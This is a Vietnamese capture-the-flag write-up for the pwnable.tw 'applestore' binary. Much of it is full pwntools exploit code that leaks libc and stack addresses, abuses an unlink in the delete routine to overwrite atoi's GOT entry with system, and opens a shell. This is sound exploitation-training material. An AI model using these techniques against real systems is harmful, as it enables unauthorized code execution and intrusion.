# applestore

Bài này mình thấy khá là hay luôn, mình đọc wu sml :(( đúng nghĩa mới thấm được. xin loi vi su ngungok nay


Oke thì bài này mình vừa làm vừa note, vừa tham khảo: [1](https://drx.home.blog/2019/04/16/pwnable-tw-applestore/) và [2](https://blog.srikavin.me/posts/pwnable-tw-applestore/)

soure thì mở ida lên đọc nhea, do thời gian cấp bách sắp test nên mình sẽ làm nhanh gọn lẹ vào vấn đề chính note lúc giải. 

Mình thấy 1 bug ở chỗ sau khi pass được checkout và có ip8 với giá 1$ thì khi ta delete nó sẽ gặp trường hợp sau:

```shell

Item Number> $ 27
Remove 27:f\x90f\x90f\x90VS\x83\xec\x8b\$\x10e\xa1\x0c from your shopping cart.

00:0000│ esp 0xff8c3690 —▸ 0x8048f98 ◂— push edx /* 'Remove %d:%s from your shopping cart.\n' */
01:0004│     0xff8c3694 ◂— 0x1b
02:0008│     0xff8c3698 —▸ 0xf7d6000a ◂— nop 

------------------------------------------------

00:0000│ esp 0xff8c3690 —▸ 0x8048f98 ◂— push edx /* 'Remove %d:%s from your shopping cart.\n' */
01:0004│     0xff8c3694 ◂— 0x1a
02:0008│     0xff8c3698 —▸ 0x92cc948 ◂— 'iPhone 6'

```

Bug ở chỗ là item lại cho phép nhập tới 22 bytes, mà name lại ngay trên stack => ta có thể overwrite để leak được libc

```python
from pwn import *

binary = context.binary = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")
r = process(binary.path)
#gdb.attach(r, api=True)

payload = b""

def Add(item):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', item)

for i in range(20):
    Add('2')
for i in range(6):
    Add('1')

r.sendlineafter('> ', '5')

log.info("Atoi got: " + hex(binary.got['atoi']))
r.sendlineafter('ok? (y/n) > ', 'y')


payload = b'27' + p32(binary.got['atoi']) #+ p32(0)*3
r.sendlineafter('> ', '3')
r.sendlineafter(b'> ', payload  )
leak_atoi_runtime_addr = r.recvline().split(b" from")[0].split(b"27:")[1]

atoi_offset = libc.symbols['atoi']
log.info("offset atoi: " + hex(atoi_offset))
libc.address = u32(leak_atoi_runtime_addr) - atoi_offset
log.info("Libc base: " + hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

log.info("system: " + hex(system))
log.info("binsh: " + hex(bin_sh))

r.interactive()

```


Oke sau khi leak libc thì ta sẽ leak tiếp stack tính ebp, mình nói cách thức trc, còn lý do thì để đi exploit hết rồi nói tiếp

Ở đây sẽ leak environ, rồi dựa vào offset so với ebp => ebp address


```shell
với libc.sym['environ'] 
ta có [*] environ ??? : 0xf7f6adbc

pwndbg> x 0xf7f6adbc
0xf7f6adbc <environ>:	0xffd9316c

53:014c│     0xffd9316c —▸ 0xffd950e1 ◂— 'SHELL=/bin/bash'


pwndbg> print $ebp
$1 = (void *) 0xffd93068
pwndbg> p 0xffd9316c - 0xffd93068
$2 = 260 (= 0x104)

```

đây là ebp của stack frame hàm delete, leak để làm gì thì sau rồi tính tiếp.

```shell
log.info("environ ??? : " + hex(libc.sym['environ']))


payload = b'27' + p32(libc.sym['environ']) #+ p32(0)*3
r.sendlineafter('> ', '3')
r.sendlineafter(b'> ', payload  )

leak_environ_addr = r.recvline().split(b" from")[0].split(b"27:")[1]

log.info("environ addr: " + hex(u32(leak_environ_addr)))
ebp_addr_delete = u32(leak_environ_addr) - 0x104

log.info("ebp addr delete stack frame addr: " + hex(ebp_addr_delete))


```

thì giờ mình đã biết lý do vì sau phải leak ebp. 

```shell
 v4 = *(v2 + 8);                // ebp - 0xc
      v5 = *(v2 + 12);          // got atoi() + 0x22
      if ( v5 )
        *(v5 + 8) = v4;         // got atoi() + 0x1a =  ebp - 0xc
      if ( v4 )
        *(v4 + 12) = v5;        // ebp = got atoi() + 0x22
```

lý do mà ebp = got + 0x22 là do, sau khi từ hàm delete trở về handler thì ta nhận thấy con trỏ nptr ta nhập vào với read, nó đang nằm ở ebp - 0x22, nên để pass -0x22 và ghi vào địa chỉ got của atoi địa chỉ hàm system thì yah. 

### exploit

```python
from pwn import *

binary = context.binary = ELF("./applestore_patched")
libc = ELF("./libc_32.so.6")


if args.REMOTE:
    r = remote("chall.pwnable.tw", 10104)
else:
    r = process(binary.path)
    #gdb.attach(r, api=True)

payload = b""

def Add(item):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', item)

for i in range(20):
    Add(b'2')
for i in range(6):
    Add(b'1')

r.sendlineafter(b'> ', b'5')

log.info("Atoi got: " + hex(binary.got['atoi']))
r.sendlineafter(b'ok? (y/n) > ', b'y')


payload = b'27' + p32(binary.got['atoi']) #+ p32(0)*3
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', payload  )
leak_atoi_runtime_addr = r.recvline().split(b" from")[0].split(b"27:")[1]

atoi_offset = libc.symbols['atoi']
log.info("offset atoi: " + hex(atoi_offset))
libc.address = u32(leak_atoi_runtime_addr) - atoi_offset
log.info("Libc base: " + hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
log.info("system: " + hex(system))
log.info("binsh: " + hex(bin_sh))

####################################################

log.info("environ ??? : " + hex(libc.sym['environ']))
payload = b'27' + p32(libc.sym['environ']) #+ p32(0)*3
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', payload  )

leak_environ_addr = r.recvline().split(b" from")[0].split(b"27:")[1]

log.info("environ addr: " + hex(u32(leak_environ_addr)))
ebp_addr_delete = u32(leak_environ_addr) - 0x104

log.info("ebp addr delete stack frame: " + hex(ebp_addr_delete))

####################################################

payload = b'27' + p32(0)*2  + p32(ebp_addr_delete - 0xc) + p32(binary.got['atoi'] + 0x22)
r.sendlineafter(b'> ', b'3')
r.sendlineafter(b'> ', payload  )
log.info("atoi got(): " + hex(binary.got['atoi']))


payload =  p32(system)  + b";id;sh;"
r.sendafter(b'> ', payload  )


r.interactive()


```

còn lý do tại sao ";sh" là do trước đó nó còn cái quái gì ấy nên phải làm thế để pass qua mớ dư thừa phía trước.


Bài này mình thấy hay ở chỗ:
- thứ quan trọng lại k lưu luôn vào heap. mà lại để trên stack
- thêm nữa các stack nó liền kề nhau tuy nhiên **item number** lại cho nhập tận 22 bytes, => overwrite mất các stack phía trên. 
- việc delete() bằng cách thay đổi con trỏ, hmmm maybe nó là tính năng như bị thay đổi tác dụng kể từ khi thg quan trọng lại nằm trên stack.

Các bước khai thác :
- leak libc với printf %s
- leak stack eviron => ebp addr
- lợi dụng delete bằng cách thay đổi con trỏ để => thay đổi old ebp => read vào địa chỉ got của 1 hàm, thay đổi nó. 

